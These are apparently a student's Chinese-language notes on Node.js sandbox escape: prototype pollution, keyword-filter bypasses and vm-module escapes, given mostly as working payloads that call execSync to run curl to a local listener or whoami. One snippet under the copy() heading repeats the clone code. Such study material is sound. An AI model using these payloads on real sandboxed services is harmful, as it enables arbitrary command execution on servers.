---
title: nodejs
date: 2023-10-11 09:10:02
categories:
- 网络安全
tags:
- web 
- nodejs
description: |
    js太难了
---

## 沙箱逃逸

### 原型链污染

**! 过滤:`__proto__`：`constructor.prototype`**

常见函数是`merge()`,`clone()`,`copy()`

- merge()

  ```js
  function merge(target, source) {
      for (let key in source) {
          if (key in source && key in target) {
              merge(target[key], source[key])
          } else {
              target[key] = source[key]
          }
      }
  }
  ```

- copy()

  ```js
  function clone(obj) {
    return merge({}, obj);
  }
  
  ```

- clone()

  ```js
  function clone(obj) {
    return merge({}, obj);
  }
  ```

### 过滤

js过滤感觉挺简单的,太易变了

- unicode编码

  `require("child_process")["exe\u0063Sync"]("curl 127.0.0.1:1234")`

- toUpperCase() / toLowerCase()

  `'ı'.toUpperCase()='I'`，`'ſ'.toUpperCase()='S'`，`'K'.toLowerCase()='k'`

- 拼接

  `obj.contructor`：`obj["contr"+"uctor"]`

- concat

  `obj["constru".concat("ctor")]`

- emm

  `String.fromCharCode(xxx)`

- eval

  `this`：`eval("th"+"is")`

- 16进制编码

  `require("child_process")["exe\x63Sync"]("curl 127.0.0.1:1234")`

- 模版字符串

  `require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234')`

- base64编码

  ​`eval(**Buffer**.**from**('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').**toString**())`

- 过滤中括号

  假如中括号被过滤，可以用`Reflect.get`来绕

  `Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes('eva')))`

剩下两个凑一块看看

- Obejct.keys
  - 利用`Object.values`就可以拿到`child_process`中的各个函数方法，再通过数组下标就可以拿到`execSync`
  - `Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')`

- Reflect
  - 在js中，需要使用`Reflect`这个关键字来实现反射调用函数的方式。譬如要得到`eval`函数，可以首先通过`Reflect.ownKeys(global)`拿到所有函数，然后`global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]`即可得到eval
  - `console.log(global[Reflect.ownKeys(global).find(x=>x.includes('eval'))])` 这样就拿到eval了,如果过滤了`eval`关键字，可以用`includes('eva')`来搜索`eval`函数，也可以用`startswith('eva')`来搜索
  - `global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]('global.process.mainModule.constructor._load("child_process").execSync("curl 127.0.0.1:1234")')`

### vm

#### this.tostring

```js
const vm = require('vm');
const script = `const process = this.toString.constructor('return process')() 
process.mainModule.require('child_process').execSync('whoami').toString()`;
const sandbox = { m: 1, n: 2 };
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res)
//第一行this.toString获取到一个函数对象，this.toString.constructor获取到函数对象的构造器（function）
//构造器中可以传入字符串类型的代码。然后在执行，即可获得process对象
```

#### **arguments.callee.caller**

- 不存在this和其他对象

  ```js
  const vm = require('vm');
  const script = `(() => {  
  const a = {}  
  a.toString = function () {    
  const cc = arguments.callee.caller;    
  const p = (cc.constructor.constructor('return process'))();   
  return p.mainModule.require('child_process').execSync('whoami').toString()  
  }
  return a })()`;
  const sandbox = Object.create(null);
  const context = new vm.createContext(sandbox);
  const res = vm.runInContext(script, context);
  console.log('Hello ' + res)
  //严格模式（"strict mode"）下会导致错误
  //arguments是在函数执行的时候存在的一个变量，我们可以通过arguments.callee.caller获得调用这个函数的调用者。
  ```

  触发条件在于console.log('Hello ' + res) 也就是字符串触发

- 没有字符串相关操作,可以使用Proxy来劫持所有属性

  ```js
  const vm = require('vm');
  const script = `(() => {  
  const a = new Proxy({}, { 
  get: function() {      
  const cc = arguments.callee.caller;      
  const p = (cc.constructor.constructor('return process'))();     
  return p.mainModule.require('child_process').execSync('whoami').toString()
  }  
  })
  return a })()`;
  const sandbox = Object.create(null);
  const context = new vm.createContext(sandbox);
  const res = vm.runInContext(script, context);
  console.log(res.xxx)
  
  只要沙箱外获取了属性,就能触发get方法,就能执行命令
  ```

- ```js
  vm = require('vm');
  const code5 = `
      throw new Proxy({}, {
      get :function(){
      const cc =  arguments.callee.caller;
      const p = (cc.constructor.constructor('return process'))();
      return p.mainModule.require('child_process').execSync('whoami').toString()
  }
  })
  `
  try {
      vm.runInContext(code5, vm.createContext(Object.create(null)));
  }catch(e){
      console.log('error happend: ' + e);
  }
  借助异常 把我们沙箱内的对象抛出去 如果外部有捕捉异常的 如日志,逻辑 则也可能触发漏洞
  ```
  